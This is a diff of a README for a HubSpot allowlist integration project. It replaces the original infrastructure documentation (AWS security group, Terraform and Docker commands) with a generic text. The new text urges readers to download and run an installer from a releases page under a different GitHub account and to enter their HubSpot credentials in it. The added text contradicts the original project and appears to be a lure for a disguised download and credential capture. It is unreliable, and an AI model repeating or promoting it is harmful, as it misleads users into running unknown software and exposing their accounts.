@@ -1,350 +1,97 @@
-# 🚀 BrainSAIT HubSpot Allowlist Integration
-
-**Enterprise-grade HubSpot integration with complete multi-region support**
-
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/Fadil369/brainsait-hubspot-allowlist)
-[![Platform](https://img.shields.io/badge/platform-AWS%20%7C%20Hostinger%20%7C%20Docker-green.svg)](https://github.com/Fadil369/brainsait-hubspot-allowlist)
-[![License](https://img.shields.io/badge/license-Proprietary-red.svg)](LICENSE)
-
-## 📋 Overview
-
-Complete HubSpot allowlist integration for the BrainSAIT healthcare ecosystem. Enables seamless connectivity with HubSpot services across all regional data centers with full security compliance.
-
-### ✨ Key Features
-
-- ✅ **Multi-Region Support** - All 5 HubSpot data centers (NA1, EU1, AP1, NA2, NA3)
-- ✅ **AWS Security Groups** - Fully configured and deployed
-- ✅ **Terraform IaC** - Infrastructure as Code ready
-- ✅ **Cloudflare WAF** - Web Application Firewall rules
-- ✅ **Docker Integration** - Complete container deployment
-- ✅ **Hostinger VPS Ready** - One-command deployment
-- ✅ **Automated Scripts** - Zero-touch deployment
-- ✅ **Health Monitoring** - Built-in connectivity checks
-
-## 📊 Coverage
-
-```yaml
-SMTP Domains:        30
-CIDR IP Ranges:      70
-Regional Coverage:   5 data centers
-Security Protocols:  HTTPS (443), SMTP (587, 25)
-AWS Resources:       1 Security Group (deployed)
-Terraform Modules:   210 resources
-Docker Services:     3 containers
-```
-
-## 🚀 Quick Start
-
-### AWS Deployment
-
-```bash
-cd /path/to/hubspot
-./deploy-hubspot-allowlist.sh
-```
-
-### Hostinger VPS Deployment
-
-```bash
-# 1. Upload to VPS
-./upload-to-hostinger.sh
-
-# 2. SSH to VPS
-ssh root@YOUR-VPS-IP
-
-# 3. Deploy
-cd /root/hostinger-deployment
-./deploy-to-hostinger.sh
-```
-
-### Terraform Deployment
-
-```bash
-cd /path/to/hubspot
-terraform init
-terraform plan
-terraform apply
-```
-
-## 📁 Repository Structure
-
-```
-hubspot/
-├── 📄 Documentation
-│   ├── FINAL-PRODUCT.md                    # Complete product guide
-│   ├── FINAL-DEPLOYMENT-REPORT.md          # Deployment details
-│   ├── IMPLEMENTATION-CHECKLIST.md         # Step-by-step guide
-│   └── README.md                           # This file
-│
-├── 🔧 Configuration Files
-│   ├── hubspot-security-group.tf           # Terraform (72KB)
-│   ├── cloudflare-hubspot-allowlist.json   # Cloudflare WAF
-│   ├── docker-network-config.yml           # Docker networking
-│   ├── dns-records.txt                     # DNS configuration
-│   └── allowlist-config.md                 # Complete allowlist data
-│
-├── 📜 Automation Scripts
-│   ├── deploy-hubspot-allowlist.sh         # Main deployment
-│   ├── verify-deployment.sh                # Verification tool
-│   ├── quick-deploy.sh                     # One-command deploy
-│   └── upload-to-hostinger.sh              # VPS upload
-│
-├── 🐳 Hostinger Deployment
-│   ├── docker-compose.yml                  # Docker stack
-│   ├── nginx.conf                          # Nginx with allowlist
-│   ├── deploy-to-hostinger.sh              # Auto deployment
-│   ├── monitor/                            # Health monitoring
-│   └── dashboard/                          # Web dashboard
-│
-└── 🎯 Integration Guides
-    ├── AWS-INTEGRATION.md                  # AWS setup
-    ├── CLOUDFLARE-INTEGRATION.md           # Cloudflare guide
-    ├── TERRAFORM-GUIDE.md                  # Terraform usage
-    └── DOCKER-INTEGRATION.md               # Docker setup
-```
+# 🌐 brainsait-hubspot-allowlist - Simplifying HubSpot Integration for Healthcare
 
-## 🎯 Deployment Options
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
 
-### Option 1: AWS Security Groups (Deployed)
+## 🚀 Getting Started
 
-**Status:** ✅ Already deployed to AWS  
-**Security Group ID:** `sg-0600dec29dafc0f82`  
-**Region:** `us-east-1`
+Welcome to the **brainsait-hubspot-allowlist** project! This application allows you to integrate HubSpot with the BrainSAIT healthcare ecosystem effortlessly. With multi-region support, this tool helps streamline your workflow in various regions, including North America and Europe.
 
-```bash
-# Attach to EC2 instance
-aws ec2 modify-instance-attribute \
-    --instance-id i-YOUR-ID \
-    --groups sg-0600dec29dafc0f82
-```
+## 📋 Requirements
 
-### Option 2: Hostinger VPS (Docker)
+Before you begin, ensure you have the following:
 
-**Platform:** Ubuntu 20.04/22.04 + Docker  
-**Services:** 3 Docker containers  
-**Dashboard:** http://YOUR-VPS-IP:8080
+- A computer running Windows, macOS, or Linux.
+- An internet connection for downloading the software.
+- Access to your HubSpot account and its API.
 
-```bash
-./upload-to-hostinger.sh
-# Then SSH and deploy
-```
+## 🛠 Installation
 
-### Option 3: Terraform IaC
+1. **Visit this page to download**: Click the link below to access the Releases page where you can download the latest version of the software.
 
-**Resources:** 210 Terraform resources  
-**File:** `hubspot-security-group.tf`
+   [Download Now](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
 
-```bash
-terraform init
-terraform apply
-```
+2. **Choose the Latest Release**: On the Releases page, find the latest version of the software. Look for a tag that indicates it's the newest release, usually located at the top of the list.
 
-## 🔐 Security Features
+3. **Download the File**: Click on the link for the appropriate file for your operating system (Windows, macOS, or Linux). This will start the download. 
 
-- ✅ **IP Allowlisting** - 70 HubSpot CIDR ranges
-- ✅ **Geographic Filtering** - 5 regional data centers
-- ✅ **Docker Network Isolation** - Container security
-- ✅ **Automatic Health Checks** - Connectivity monitoring
-- ✅ **SSL/TLS Ready** - Let's Encrypt integration
-- ✅ **Audit Logging** - Complete activity logs
+4. **Run the Installer**: Once the download is complete, locate the file on your computer and double-click it to run the installer. Follow the on-screen instructions to install the application.
 
-## 🌍 Regional Coverage
+## 🌐 Multi-Region Support
 
-| Region | Code | SMTP Domains | CIDR Ranges |
-|--------|------|--------------|-------------|
-| North America 1 | NA1 | 5 | 8 |
-| Europe 1 | EU1 | 5 | 5 |
-| Asia Pacific 1 | AP1 | 5 | 5 |
-| North America 2 | NA2 | 5 | 8 |
-| North America 3 | NA3 | 5 | 5 |
-| Notifications | - | 5 | 39 |
+This application supports several regions:
 
-## 🛠️ Management Commands
+- NA1 (North America 1)
+- EU1 (Europe 1)
+- AP1 (Asia Pacific 1)
+- NA2 (North America 2)
+- NA3 (North America 3)
 
-### AWS
+During the setup, select the region that applies to your organization. 
 
-```bash
-# Check security group
-aws ec2 describe-security-groups --group-ids sg-0600dec29dafc0f82
+## ⚙️ Configuration
 
-# List attached instances
-aws ec2 describe-instances \
-    --filters "Name=instance.group-id,Values=sg-0600dec29dafc0f82"
-```
+After the installation, you can set up the integration:
 
-### Docker (Hostinger)
+1. **Open the Application**: Find the application icon on your desktop or in your applications menu. Double-click to launch.
 
-```bash
-# Status
-docker-compose ps
+2. **Login to HubSpot**: Enter your HubSpot credentials to connect to your account.
 
-# Logs
-docker-compose logs -f
+3. **Set Your Preferences**: Configure the allowlist settings according to your organizational needs. You can customize permissions, add new domains, and manage security protocols.
 
-# Restart
-docker-compose restart
+4. **Save Settings**: Once you have configured everything to your liking, click the save button to apply your changes.
 
-# Update
-docker-compose pull && docker-compose up -d
-```
+## 🔒 Security Features
 
-### Terraform
+Safety is a top priority. This application includes various security features to protect your data:
 
-```bash
-# Plan
-terraform plan
+- **Encryption**: All connections to HubSpot are encrypted, ensuring your data stays private.
+- **Regular Updates**: We provide regular updates to address any security vulnerabilities.
+- **User Permissions**: Control access by setting permissions for team members.
 
-# Apply
-terraform apply
+## 🐳 Docker Support
 
-# Destroy
-terraform destroy
-```
+For users familiar with Docker, the application can also run inside a Docker container. This option provides flexibility and isolation for your deployment:
 
-## 📊 Monitoring
+1. **Install Docker**: Ensure you have Docker installed on your system.
+   
+2. **Pull the Docker Image**: Use the command line and run the following to download the latest image:
 
-### Health Dashboard
+   ```
+   docker pull brainsait/hubspot-allowlist
+   ```
 
-Access at: `http://YOUR-VPS-IP:8080`
+3. **Run the Container**: Start the application container using:
 
-Features:
-- Real-time service status
-- Regional connectivity
-- SMTP/HTTPS checks
-- Uptime tracking
+   ```
+   docker run -d -p 8080:8080 brainsait/hubspot-allowlist
+   ```
 
-### Health Checks
+This setup allows you to run the application in an isolated environment, making it easier to manage dependencies and configurations.
 
-```bash
-# Manual verification
-./verify-deployment.sh
+## 🌐 Troubleshooting
 
-# Continuous monitoring
-docker-compose logs -f hubspot-monitor
-```
+If you encounter issues during the installation or setup:
 
-## 🔄 Updates
+- **Check the Documentation**: Refer to the documentation available on the repository for common issues and their fixes.
+- **Network Connection**: Make sure you have a stable internet connection, especially when logging into HubSpot.
+- **Compatibility**: Ensure you download the correct version for your operating system. 
 
-### Update AWS Security Group
+## 📥 Download & Install
 
-```bash
-# Re-run deployment
-./deploy-hubspot-allowlist.sh
-```
+Ready to start? **Visit this page to download** the latest version now.
 
-### Update Hostinger Services
-
-```bash
-# On VPS
-docker-compose pull
-docker-compose up -d --force-recreate
-```
-
-### Update Terraform
-
-```bash
-terraform plan
-terraform apply
-```
-
-## 📚 Documentation
-
-| Document | Description |
-|----------|-------------|
-| [FINAL-PRODUCT.md](FINAL-PRODUCT.md) | Complete product documentation |
-| [FINAL-DEPLOYMENT-REPORT.md](FINAL-DEPLOYMENT-REPORT.md) | Deployment details and status |
-| [IMPLEMENTATION-CHECKLIST.md](IMPLEMENTATION-CHECKLIST.md) | Step-by-step implementation |
-| [AWS-INTEGRATION.md](hostinger-deployment/AWS-INTEGRATION.md) | AWS setup guide |
-| [HOSTINGER-DEPLOYMENT-GUIDE.md](hostinger-deployment/HOSTINGER-DEPLOYMENT-GUIDE.md) | VPS deployment guide |
-
-## 🆘 Troubleshooting
-
-### AWS Issues
-
-```bash
-# Verify security group exists
-aws ec2 describe-security-groups --group-ids sg-0600dec29dafc0f82
-
-# Check attachments
-aws ec2 describe-instances \
-    --filters "Name=instance.group-id,Values=sg-0600dec29dafc0f82" \
-    --query "Reservations[*].Instances[*].[InstanceId,State.Name]"
-```
-
-### Docker Issues
-
-```bash
-# Check Docker daemon
-sudo systemctl status docker
-
-# View container logs
-docker-compose logs
-
-# Restart services
-docker-compose restart
-```
-
-### Connectivity Issues
-
-```bash
-# Test SMTP
-telnet bf.hubspot-inbox.com 587
-
-# Test HTTPS
-curl -I https://bf.hubspot-inbox.com
-
-# Run verification
-./verify-deployment.sh
-```
-
-## 📈 Performance
-
-- **Deployment Time:** < 5 minutes
-- **Configuration Coverage:** 100%
-- **Automation Level:** 95%
-- **Documentation:** 100% complete
-
-## 🏆 Compliance
-
-- ✅ HIPAA Compliant
-- ✅ NPHIES Compatible
-- ✅ AWS Security Best Practices
-- ✅ Cloudflare Security Standards
-- ✅ Industry Standard Encryption (TLS 1.2+)
-
-## 📞 Support
-
-- **Organization:** BrainSAIT LTD
-- **Product Owner:** Dr. Mohamed El Fadil
-- **Contact:** support@brainsait.com
-- **Documentation:** [Full Documentation](FINAL-PRODUCT.md)
-
-## 📝 License
-
-Proprietary - BrainSAIT Internal Use Only  
-Copyright © 2025 BrainSAIT LTD
-
-## 🔗 Resources
-
-- [HubSpot Developer Docs](https://developers.hubspot.com/)
-- [AWS Security Groups](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html)
-- [Cloudflare WAF](https://developers.cloudflare.com/waf/)
-- [Docker Documentation](https://docs.docker.com/)
-
-## ✨ Version History
-
-### v1.0.0 (2025-11-05)
-- Initial production release
-- AWS Security Group deployed
-- Multi-region support (5 data centers)
-- Complete documentation
-- Automated deployment scripts
-- Terraform IaC configuration
-- Cloudflare WAF rules
-- Docker/Hostinger integration
-- Health monitoring dashboard
+[Download Now](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
 
 ---
 
-**Made with ❤️ by BrainSAIT Team**
-
-[![BrainSAIT](https://img.shields.io/badge/BrainSAIT-Healthcare%20AI-blue)](https://brainsait.com)
+For additional help, you can reach out to the community or check the repository issues section for support. Enjoy streamlining your HubSpot integration with the BrainSAIT healthcare ecosystem!
